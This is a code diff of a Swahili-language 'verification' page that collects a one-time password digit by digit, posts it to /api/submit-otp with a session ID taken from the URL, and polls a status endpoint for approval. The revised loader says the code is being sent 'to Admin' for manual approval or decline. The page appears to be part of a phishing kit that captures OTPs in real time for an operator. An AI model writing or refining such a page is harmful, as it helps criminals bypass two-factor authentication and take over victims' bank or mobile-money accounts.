@@ -1,76 +1,151 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .otp-input { width: 45px; height: 55px; border: 2px solid #cbd5e1; border-radius: 12px; text-align: center; font-size: 1.5rem; font-weight: bold; color: #003366; }
-        .otp-input:focus { border-color: #ffd600; outline: none; }
-        /* Pendulum Style Spin Animation */
-        .pendulum { display: flex; gap: 8px; justify-content: center; margin-top: 20px; }
-        .dot { width: 12px; height: 12px; background: #ffd600; border-radius: 50%; animation: swing 0.6s infinite alternate; }
-        @keyframes swing { from { transform: translateX(-15px); } to { transform: translateX(15px); } }
+      .otp-input {
+        width: 45px;
+        height: 55px;
+        border: 2px solid #cbd5e1;
+        border-radius: 12px;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        color: #003366;
+      }
+      .otp-input:focus {
+        border-color: #ffd600;
+        outline: none;
+      }
+      .pendulum {
+        display: flex;
+        gap: 8px;
+        justify-content: center;
+        margin-top: 20px;
+      }
+      .dot {
+        width: 12px;
+        height: 12px;
+        background: #ffd600;
+        border-radius: 50%;
+        animation: swing 0.6s infinite alternate;
+      }
+      @keyframes swing {
+        from {
+          transform: translateX(-15px);
+        }
+        to {
+          transform: translateX(15px);
+        }
+      }
     </style>
-</head>
-<body class="bg-white flex flex-col items-center justify-center min-h-screen p-6">
+  </head>
+  <body
+    class="bg-white flex flex-col items-center justify-center min-h-screen p-6"
+  >
     <div class="text-center w-full max-w-sm">
-        <h2 class="text-2xl font-bold text-[#003366] mb-2">Uhakiki</h2>
-        <p class="text-gray-500 mb-8">Ingiza kodi uliyotumiwa</p>
+      <h2 class="text-2xl font-bold text-[#003366] mb-2">Uhakiki</h2>
+      <p class="text-gray-500 mb-8">Ingiza kodi uliyotumiwa</p>
 
-        <div id="box-container" class="flex justify-center gap-2 mb-8"></div>
+      <div id="box-container" class="flex justify-center gap-2 mb-8"></div>
 
-        <div id="loader" class="hidden">
-            <div class="pendulum"><div class="dot"></div><div class="dot" style="animation-delay: 0.2s"></div></div>
-            <p class="text-gray-400 italic text-sm mt-4">Inahakiki...</p>
+      <div id="loader" class="hidden">
+        <div class="pendulum">
+          <div class="dot"></div>
+          <div class="dot" style="animation-delay: 0.2s"></div>
         </div>
+        <p class="text-gray-400 italic text-sm mt-4">Inatuma kwa Admin...</p>
+      </div>
 
-        <p id="error" class="hidden text-red-500 font-bold">Kodi si sahihi. Jaribu tena.</p>
+      <p id="error" class="hidden text-red-500 font-bold">
+        Kodi si sahihi. Jaribu tena.
+      </p>
     </div>
 
     <script>
-        const sessionId = localStorage.getItem('sessionId');
-        const digits = new URLSearchParams(window.location.search).get('digits') || 6;
-        const container = document.getElementById('box-container');
+      const urlParams = new URLSearchParams(window.location.search);
 
-        for (let i = 0; i < digits; i++) {
-            const input = document.createElement('input');
-            input.type = "tel"; input.maxLength = 1; input.className = "otp-input";
-            input.addEventListener('input', (e) => {
-                if (e.target.value && e.target.nextElementSibling) e.target.nextElementSibling.focus();
-                submitOtp();
-            });
-            container.appendChild(input);
+      // Get ID from URL (?id=...)
+      const sessionId = urlParams.get("id");
+
+      // Get digits from URL (?digits=... or ?len=...)
+      const digits = urlParams.get("digits") || urlParams.get("len") || 6;
+
+      const container = document.getElementById("box-container");
+
+      // Generate Inputs
+      for (let i = 0; i < digits; i++) {
+        const input = document.createElement("input");
+        input.type = "tel";
+        input.maxLength = 1;
+        input.className = "otp-input";
+        input.addEventListener("input", (e) => {
+          if (e.target.value && e.target.nextElementSibling) {
+            e.target.nextElementSibling.focus();
+          }
+          const allInputs = document.querySelectorAll(".otp-input");
+          const allFilled = Array.from(allInputs).every((i) => i.value !== "");
+          if (allFilled) submitOtp();
+        });
+        container.appendChild(input);
+      }
+
+      async function submitOtp() {
+        const otpValue = Array.from(document.querySelectorAll(".otp-input"))
+          .map((i) => i.value)
+          .join("");
+
+        document.getElementById("loader").classList.remove("hidden");
+        document.getElementById("error").classList.add("hidden");
+
+        try {
+          const response = await fetch("/api/submit-otp", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              otp: otpValue,
+              sessionId: sessionId,
+            }),
+          });
+
+          if (response.ok) {
+            startPolling();
+          } else {
+            alert("Session Expired. Please restart.");
+            window.location.href = "index.html";
+          }
+        } catch (err) {
+          console.error("Connection error:", err);
         }
+      }
 
-        async function submitOtp() {
-            const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
-            if (otp.length == digits) {
-                document.getElementById('loader').classList.remove('hidden');
-                document.getElementById('error').classList.add('hidden');
-                await fetch('/api/submit-otp', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ otp, sessionId })
-                });
-                startPolling();
+      function startPolling() {
+        const timer = setInterval(async () => {
+          if (!sessionId) return clearInterval(timer);
+
+          try {
+            const res = await fetch(`/api/status/${sessionId}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+              clearInterval(timer);
+              window.location.href = "dashboard.html";
+            } else if (data.status === "declined") {
+              clearInterval(timer);
+              document.getElementById("loader").classList.add("hidden");
+              document.getElementById("error").classList.remove("hidden");
+              // Reset inputs
+              document
+                .querySelectorAll(".otp-input")
+                .forEach((i) => (i.value = ""));
+              document.querySelectorAll(".otp-input")[0].focus();
             }
-        }
-
-        function startPolling() {
-            const timer = setInterval(async () => {
-                const res = await fetch(`/api/status/${sessionId}`);
-                const data = await res.json();
-                if (data.status === 'approved') {
-                    window.location.href = "dashboard.html";
-                } else if (data.status === 'declined') {
-                    clearInterval(timer);
-                    document.getElementById('loader').classList.add('hidden');
-                    document.getElementById('error').classList.remove('hidden');
-                    document.querySelectorAll('.otp-input').forEach(i => i.value = '');
-                }
-            }, 2000);
-        }
+          } catch (e) {
+            console.log("Polling error...");
+          }
+        }, 2000);
+      }
     </script>
-</body>
+  </body>
 </html>
